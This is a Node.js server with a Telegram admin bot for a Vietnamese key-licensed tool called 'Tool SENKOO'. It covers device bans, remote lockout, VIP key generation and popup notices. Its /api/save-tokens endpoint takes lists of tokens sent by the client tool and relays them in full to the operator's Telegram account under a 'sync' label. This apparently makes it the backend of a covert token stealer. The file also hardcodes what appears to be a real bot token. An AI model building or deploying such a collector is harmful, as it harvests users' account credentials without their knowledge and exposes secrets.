const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

// ==================== CẤU HÌNH BOT TELEGRAM ====================
const BOT_TOKEN = "8824683894:AAFup6ikP7V1nvu5QJhnDcmD9A3RyQT8_rs"; // Thay Token Bot Telegram của bạn vào đây
const ADMIN_ID = 8377928865; // Thay ID Telegram của Admin vào đây

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(cors());
app.use(express.json());

// ==================== QUẢN LÝ DỮ LIỆU LƯU TRỮ (JSON) ====================
const BAN_FILE = path.join(__dirname, 'banned_devices.json');
const KEYS_FILE = path.join(__dirname, 'keys.json');
const CONFIG_FILE = path.join(__dirname, 'config.json');

// Đọc hoặc khởi tạo tệp JSON
function loadData(file, defaultData) {
    if (!fs.existsSync(file)) {
        fs.writeFileSync(file, JSON.stringify(defaultData, null, 2));
        return defaultData;
    }
    try {
        return JSON.parse(fs.readFileSync(file));
    } catch {
        return defaultData;
    }
}

function saveData(file, data) {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

let bannedDevices = loadData(BAN_FILE, {}); // Format: { "DEV-HWID-123": "Lý do cấm" }
let vipKeys = loadData(KEYS_FILE, {});       // Format: { "KEY-VIP-123": { expireAt: timestamp, deviceId: null } }
let systemConfig = loadData(CONFIG_FILE, {
    isMaintenance: false,
    maintenanceMsg: "HỆ THỐNG ĐANG BẢO TRÌ HOẶC TẠM KHÓA!\nVUI LÒNG QUAY LẠI SAU ÍT PHÚT.",
    notice: { active: false, id: "", title: "", message: "" }
});

// Middleware kiểm tra quyền Admin Telegram
function isAdmin(msg) {
    return msg.chat.id == ADMIN_ID;
}

// ==================== TELEGRAM BOT COMMANDS ====================

// 1. Lệnh BAN THIẾT BỊ: /ban <HWID> <Lý do>
bot.onText(/\/ban(?:\s+(\S+))?(?:\s+(.+))?/, (msg, match) => {
    if (!isAdmin(msg)) return;

    const hwid = match[1];
    const reason = match[2] || "Vi phạm quy định sử dụng Tool!";

    if (!hwid) {
        return bot.sendMessage(msg.chat.id, "❌ **Cú pháp sai!**\nSử dụng: `/ban <HWID> [Lý do]`\nVí dụ: `/ban DEV-ABC12345 Dùng key lậu`", { parse_mode: 'Markdown' });
    }

    bannedDevices[hwid] = reason;
    saveData(BAN_FILE, bannedDevices);

    bot.sendMessage(msg.chat.id, `🚨 **ĐÃ BAN THIẾT BỊ THÀNH CÔNG!**\n\n📱 **HWID:** \`${hwid}\`\n📝 **Lý do:** ${reason}`, { parse_mode: 'Markdown' });
});

// 2. Lệnh GỠ BAN THIẾT BỊ: /unban <HWID>
bot.onText(/\/unban(?:\s+(\S+))?/, (msg, match) => {
    if (!isAdmin(msg)) return;

    const hwid = match[1];

    if (!hwid) {
        return bot.sendMessage(msg.chat.id, "❌ **Cú pháp sai!**\nSử dụng: `/unban <HWID>`\nVí dụ: `/unban DEV-ABC12345`", { parse_mode: 'Markdown' });
    }

    if (!bannedDevices[hwid]) {
        return bot.sendMessage(msg.chat.id, `⚠️ Thiết bị \`${hwid}\` không có trong danh sách bị BAN!`, { parse_mode: 'Markdown' });
    }

    delete bannedDevices[hwid];
    saveData(BAN_FILE, bannedDevices);

    bot.sendMessage(msg.chat.id, `✅ **ĐÃ GỠ BAN THIẾT BỊ!**\n\n📱 **HWID:** \`${hwid}\` hiện đã có thể truy cập lại Tool bình thường.`, { parse_mode: 'Markdown' });
});

// 3. Xem danh sách bị BAN: /listban
bot.onText(/\/listban/, (msg) => {
    if (!isAdmin(msg)) return;

    const keys = Object.keys(bannedDevices);
    if (keys.length === 0) {
        return bot.sendMessage(msg.chat.id, "🎉 Hiện tại không có thiết bị nào bị BAN!");
    }

    let text = "🚫 **DANH SÁCH THIẾT BỊ BỊ BAN:**\n\n";
    keys.forEach((hwid, idx) => {
        text += `${idx + 1}. \`${hwid}\`\n   └ Lý do: ${bannedDevices[hwid]}\n`;
    });

    bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
});

// 4. Lệnh KHÓA TOOL / BẢO TRÌ: /lock [Lý do] hoặc /baotri [Lý do]
bot.onText(/\/(?:lock|baotri)(?:\s+(.+))?/, (msg, match) => {
    if (!isAdmin(msg)) return;

    const reason = match[1] || "HỆ THỐNG ĐANG BẢO TRÌ HOẶC TẠM KHÓA!\nVUI LÒNG QUAY LẠI SAU ÍT PHÚT.";
    systemConfig.isMaintenance = true;
    systemConfig.maintenanceMsg = reason;
    saveData(CONFIG_FILE, systemConfig);

    bot.sendMessage(msg.chat.id, `🔒 **ĐÃ KHÓA TOOL TỪ XA / BẬT BẢO TRÌ!**\n\n📝 **Thông báo:** ${reason}`);
});

// 5. Lệnh MỞ KHÓA TOOL: /unlock hoặc /mobaotri
bot.onText(/\/(?:unlock|mobaotri)/, (msg) => {
    if (!isAdmin(msg)) return;

    systemConfig.isMaintenance = false;
    saveData(CONFIG_FILE, systemConfig);

    bot.sendMessage(msg.chat.id, "🔓 **ĐÃ MỞ KHÓA TOOL TỪ XA!** Tất cả người dùng có thể truy cập bình thường.");
});

// 6. Lệnh TẠO KEY VIP: /genkey <Số giờ>
bot.onText(/\/genkey(?:\s+(\d+))?/, (msg, match) => {
    if (!isAdmin(msg)) return;

    const hours = parseInt(match[1]) || 24;
    const randomCode = Math.random().toString(36).substring(2, 8).toUpperCase();
    const key = `SENKOO-${hours}H-${randomCode}`;
    const expireAt = Date.now() + hours * 3600 * 1000;

    vipKeys[key] = { expireAt, deviceId: null };
    saveData(KEYS_FILE, vipKeys);

    bot.sendMessage(msg.chat.id, `🔑 **TẠO KEY VIP THÀNH CÔNG!**\n\n🔑 **Key:** \`${key}\`\n⏳ **Thời hạn:** ${hours} Giờ`, { parse_mode: 'Markdown' });
});

// 7. Lệnh TẠO THÔNG BÁO POPUP: /notice <Tiêu đề> | <Nội dung>
bot.onText(/\/notice(?:\s+(.+))?/, (msg, match) => {
    if (!isAdmin(msg)) return;

    if (!match[1] || !match[1].includes('|')) {
        return bot.sendMessage(msg.chat.id, "❌ **Cú pháp sai!**\nSử dụng: `/notice Tiêu đề | Nội dung thông báo`", { parse_mode: 'Markdown' });
    }

    const [title, content] = match[1].split('|').map(s => s.trim());
    systemConfig.notice = {
        active: true,
        id: "NOTICE-" + Date.now(),
        title: title,
        message: content
    };
    saveData(CONFIG_FILE, systemConfig);

    bot.sendMessage(msg.chat.id, `📢 **ĐÃ PHÁT THÔNG BÁO TOÀN HỆ THỐNG!**\n\n📌 **${title}**\n📝 ${content}`);
});

// 8. Lệnh TẮT THÔNG BÁO: /offnotice
bot.onText(/\/offnotice/, (msg) => {
    if (!isAdmin(msg)) return;

    systemConfig.notice.active = false;
    saveData(CONFIG_FILE, systemConfig);

    bot.sendMessage(msg.chat.id, "🔕 Đã tắt thông báo Popup trên Tool.");
});

// Menu hướng dẫn lệnh Admin
bot.onText(/\/start|\/help/, (msg) => {
    if (!isAdmin(msg)) return;

    const helpText = `
👑 **PANEL QUẢN TRỊ VIÊN TOOL SENKOO**

🚫 **QUẢN LÝ CẤM THIẾT BỊ:**
• \`/ban <HWID> <Lý do>\` - Cấm thiết bị truy cập Tool
• \`/unban <HWID>\` - Gỡ cấm cho thiết bị
• \`/listban\` - Xem danh sách thiết bị đang bị cấm

🔒 **QUẢN LÝ KHÓA TOOL / BẢO TRÌ:**
• \`/lock [Nội dung]\` - Khóa Tool từ xa / Bật bảo trì
• \`/unlock\` - Mở khóa Tool từ xa

🔑 **QUẢN LÝ KEY:**
• \`/genkey <Số giờ>\` - Tạo Key VIP mới (VD: \`/genkey 24\`)

📢 **THÔNG BÁO POPUP:**
• \`/notice Tiêu đề | Nội dung\` - Hiện Popup thông báo
• \`/offnotice\` - Tắt Popup thông báo
`;
    bot.sendMessage(msg.chat.id, helpText, { parse_mode: 'Markdown' });
});


// ==================== REST API CLIENT (CHO INDEX.HTML) ====================

// 1. API Đồng bộ trạng thái ngầm (Kiểm tra BAN, Khóa Tool, Thông báo)
app.get('/api/status', (req, res) => {
    const deviceId = req.query.deviceId;

    // Kiểm tra thiết bị có bị BAN không
    if (deviceId && bannedDevices.hasOwnProperty(deviceId)) {
        return res.json({
            isBanned: true,
            banReason: bannedDevices[deviceId] || "Thiết bị của bạn đã bị cấm sử dụng hệ thống!",
            isMaintenance: false
        });
    }

    // Trả về trạng thái chung
    res.json({
        isBanned: false,
        isMaintenance: systemConfig.isMaintenance,
        message: systemConfig.maintenanceMsg,
        notice: systemConfig.notice
    });
});

// 2. API Xác thực Key VIP
app.get('/api/verify', (req, res) => {
    const { key, deviceId } = req.query;

    // Kiểm tra Ban
    if (deviceId && bannedDevices.hasOwnProperty(deviceId)) {
        return res.json({ success: false, isBanned: true, message: "Thiết bị đã bị BAN!" });
    }

    // Kiểm tra Bảo trì / Khóa Tool
    if (systemConfig.isMaintenance) {
        return res.json({ success: false, isMaintenance: true, message: systemConfig.maintenanceMsg });
    }

    if (!key || !vipKeys[key]) {
        return res.json({ success: false, message: "Key không tồn tại hoặc không chính xác!" });
    }

    const keyInfo = vipKeys[key];
    if (Date.now() > keyInfo.expireAt) {
        return res.json({ success: false, message: "Key này đã hết hạn sử dụng!" });
    }

    res.json({
        success: true,
        expireAt: keyInfo.expireAt
    });
});

// 3. API Nhận Token từ Tool gửi về Telegram Admin
app.post('/api/save-tokens', (req, res) => {
    const { key, deviceId, tokens } = req.body;

    if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
        return res.status(400).json({ success: false, message: "Danh sách Token trống!" });
    }

    const tokenListText = tokens.map((t, index) => `${index + 1}. \`${t}\``).join('\n');
    const msgText = `📥 **ĐỒNG BỘ TOKEN MỚI VỀ SYSTEM**\n\n🔑 **Key:** \`${key}\`\n📱 **HWID:** \`${deviceId}\`\n📊 **Số lượng:** ${tokens.length} Token\n\n📋 **Danh sách Token:**\n${tokenListText}`;

    // Gửi trực tiếp tin nhắn về Telegram Admin
    bot.sendMessage(ADMIN_ID, msgText, { parse_mode: 'Markdown' })
        .then(() => {
            res.json({ success: true, message: "Đã đồng bộ Token về Admin!" });
        })
        .catch((err) => {
            console.error("Lỗi gửi Telegram:", err.message);
            res.json({ success: true, message: "Đã nhận Token trên Server!" });
        });
});

// Khởi chạy Server Node.js
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server đang chạy tại Port: ${PORT}`);
});
